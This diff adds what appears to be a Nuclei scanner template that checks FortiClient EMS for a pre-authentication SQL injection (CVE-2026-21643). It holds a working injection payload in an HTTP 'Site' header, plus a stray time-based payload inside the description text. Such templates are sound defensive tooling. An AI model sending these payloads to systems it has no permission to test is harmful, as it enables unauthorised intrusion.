@@ -1,0 +1,34 @@
+id: forticlient-emsinit_consts-pre-auth-sql-injection
+
+info:
+  name: "FortiClient 接口预认证 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    Fortinet 提供的终端集中管理平台，用于统一部署、配置、监控和保护企业网络中的终端设备（如 Windows、macOS、Linux、iOS、Android 等），并深度集成于 Fortinet Security Fabric 安全架构中，实现零信任（ZTNA）与终端安全的协同防御。
+          x'; SELECT pg_sleep(5)--
+  reference:
+  - CVE-2026-21643
+  tags: FortiClient
+
+http:
+  - raw:
+      - |
+        GET /api/v1/init_consts HTTP/1.1
+        Host: {{Hostname}}
+        Site: x'; SELECT 1/0--
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "division by zero"
+      - type: word
+        part: body
+        words:
+          - "PostgreSQL"
